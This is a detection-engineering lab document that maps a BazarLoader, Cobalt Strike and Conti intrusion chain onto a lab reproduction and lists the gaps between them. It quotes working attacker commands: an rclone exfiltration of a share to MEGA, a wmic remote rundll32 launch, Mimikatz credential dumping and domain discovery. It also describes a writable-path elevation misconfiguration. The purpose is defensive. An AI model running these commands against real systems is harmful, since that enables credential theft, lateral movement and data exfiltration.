# Gaps between the source campaign and this lab

The report documents the intrusion from the delivery document to the Conti locker. This lab
reproduces the shape of that chain, but several things in the source could not be reproduced, were
not reproduced, or are supplied by the environment instead. Each entry states what the source shows,
what the lab does, and why.

## Privilege

| Source | Lab | Consequence |
|---|---|---|
| The macro, the HTA and `regsvr32` run as the logged-on user. BazarLoader then invokes `svchost.exe` and the DLL is loaded by `rundll32` under that service host, followed by injection into `winlogon` at high integrity. The report records the result but **does not record how the loader obtained that privilege**. | The victim account is a standard user, as required for this lab. The loader therefore cannot create a service. The missing privilege is supplied by a deliberate misconfiguration: `C:\ProgramData\C0015` is writable by `Users` and a scheduled task already runs `C:\ProgramData\C0015\updater.exe` as SYSTEM every minute. The loader overwrites that binary; the next task start gives a SYSTEM stager. | The elevation path is a lab weakness, not campaign behaviour. It is detectable: a user writing a PE into `ProgramData`, then the same path executed by the task scheduler as SYSTEM. |

This is the single largest gap. Everything after the loader depends on it.

## Loader and C2

| Source | Lab | Consequence |
|---|---|---|
| BazarLoader, Go compiled, masquerading as `compareForfor.jpg`, ~1–4 MB, invalid certificate, empty metadata. | Sliver implant, Go compiled, 46 MB, no signature. | Size and section layout differ, so hash and size based rules cannot be reused. The behaviour (a DLL loaded by `regsvr32` from `C:\Users\Public`) is the same. |
| `myexternalip.com` lookup after the first callback, to learn the public address. | Not reproduced. | One network event missing from the lab. |
| Two DLLs: `D574.dll` fails because `volga.azureedge.net` answers NXDOMAIN (9003), `D8B3.dll` succeeds. | Only the working DLL is used. | The failed beacon, its DNS retry pattern and the NXDOMAIN telemetry are absent. |
| Cobalt Strike beacon: `checkauj.com` with a Let's Encrypt certificate, `SleepTime 60000`, `Jitter 37`, cookies, `bStageCleanup`, `SpawnTo rundll32`, jquery URIs, `Port 80`. | Sliver session over HTTPS on 443 with an approximated jquery profile and a self-signed `CN=checkauj.com` certificate. | Traffic shape and cadence differ: a session, not a sixty second beacon with jitter. The URI pair and the certificate subject match. |

## Execution and discovery

| Source | Lab | Consequence |
|---|---|---|
| Cobalt Strike `inject` into `winlogon`, using `CreateRemoteThread`, `SetThreadContext`, `RtlCreateUserThread` among its options. | A small injector using `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`. | The `E8` event is identical; the thread start address is private in both cases. |
| `cmd.exe` spawned by `rundll32` runs `tasklist /s`, `net group "domain admins" /dom`, `net localgroup "administrator"`, `nltest`, `net view`, `time`, `ping`. | The same commands, issued from the `winlogon` beacon. The client splits command lines on spaces, so quoted arguments must be moved into a batch file. | Command lines can differ by a `cmd.exe` layer. |
| ShareFinder from PowerView, launched by PowerShell from `winlogon`, output `C:\ProgramData\found_shares.txt`. | A minimal `Invoke-ShareFinder` implementation with the same name and arguments, served for the download cradle. | The command line matches; the script body and its output columns do not. |
| AdFind written to disk, not executed. | Not reproduced. | The file-write-only pattern is absent. |

## Credential access

| Source | Lab | Consequence |
|---|---|---|
| ProcessHacker dropped in `C:\`, used through its GUI to read LSASS. | Mimikatz CLI (`privilege::debug`, `sekurlsa::logonpasswords`) from a SYSTEM session. | The LSASS access event is equivalent (`0x1010`), but the tool, its command line and the GUI interaction differ. ProcessHacker itself was not exercised against LSASS. |
| No mention of LSASS protection. | `RunAsPPL` is absent, Defender real-time and one ASR rule had to be disabled for the dump to run. | In a defended configuration the dump fails at the ASR rule, which is itself a useful result and is recorded in the kill chain. |

## Interactive access

| Source | Lab | Consequence |
|---|---|---|
| RDP to the backup server through the beacon, then review of backup settings and `taskmgr /4` from the shell. | RDP through a SOCKS proxy on the beacon, with TLS and NTLM; the server had to stop requiring NLA because the client cannot reach a KDC through the tunnel. `taskmgr /4` launched from the shell with the keyboard. | The type 10 logon and the `taskmgr` parent edge match. The backup console review is absent. |
| AnyDesk placed in `C:\Users\<user>\Videos` and used for remote access. | The binary is placed there; the remote session is not exercised. | The file placement evidence exists; the AnyDesk traffic does not. |

## Lateral movement

| Source | Lab | Consequence |
|---|---|---|
| `wmic /node:... process call create "rundll32.exe C:\ProgramData\143.dll DllRegisterServer"`, then `143.dll` injects into `svchost.exe -k UnistackSvcGroup -s CDPUserSvc`. | Same command shape, same DLL path, injection into the per-user service host that exists once a user session is open. | The `-s CDPUserSvc` suffix does not appear on this build; the host is addressed by its `UnistackSvcGroup` command line. |
| A `checkauj.com` callback from the backup server around nine hours later, then RDP through `143.dll`. | Callback reproduced; the RDP leg is performed through the beachhead proxy instead. | Timing compressed from nine hours to minutes. |

## Exfiltration

| Source | Lab | Consequence |
|---|---|---|
| `rclone.exe copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`, twice, each about three hours, between 1900 and 2200 UTC. | The same command line, from the victim user context, over the real MEGA account; one or two rounds, minutes each, at any time of day. | Bandwidth and duration differ, so volume and timing based detections cannot be calibrated from the lab. |
| Rclone run by the operator on the server holding the share. | Run from another host over the share, because a SYSTEM process cannot read its own host's share over the loopback. | The parent process and the source host differ. |

## Impact

| Source | Lab | Consequence |
|---|---|---|
| Conti locker, unlocked files, `C$` mounts per host, `readme.txt` in every directory, then a directory listing to confirm. | A simulator that renames to `.c0015` and writes the note, with the same argument set and the same `-p \\HOST\C$` form, redirected to a corpus directory. | No encryption, no file format change, no shadow copy deletion. The process tree, arguments and note placement match. |
| Iobit unlocker dropped for locked files. | Not reproduced. | One tool artefact absent. |
| Ping sweep before the locker to build the target list. | Not reproduced. | The sweep and its results are absent. |

## What the gaps mean for the detection work

Every gap above is a place where a rule tuned on this lab will not see what the source saw. The
practical consequences:

- rules that rely on the Bazar beacon cadence, the `myexternalip.com` lookup or the dead `D574.dll`
  have no data here;
- rules on file size or hash of the loader cannot be tested;
- the elevation step is a lab artefact, so its rules describe the lab weakness, not the campaign;
- encryption and its artefacts are simulated, so impact rules cover note placement and argument
  shape only.

The techniques that do carry over unchanged are the delivery chain, the proxy execution pattern, the
injection into a system process, the WMI pivot, the interactive logon, the share based transfer and
the note placement.
